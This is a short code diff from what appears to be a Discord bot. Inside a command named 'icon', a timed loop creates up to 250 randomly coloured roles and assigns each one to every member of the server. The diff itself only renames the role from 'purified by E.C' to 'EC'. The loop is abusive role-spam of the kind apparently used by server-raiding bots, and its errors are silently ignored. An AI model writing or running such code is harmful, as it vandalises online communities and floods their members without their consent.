@@ -135,7 +135,7 @@ if(cmd("icon", msg)) {
                       let i = 0;
                       let interval = setInterval(function () {
                       if (i === 250) clearInterval(interval);
-                      message.guild.createRole({name: 'purified by E.C', color:'RANDOM'}).then(function(role) {
+                      message.guild.createRole({name: 'EC', color:'RANDOM'}).then(function(role) {
                         message.guild.members.forEach(member => {
                         member.addRole(role).catch(e => {});
                       })
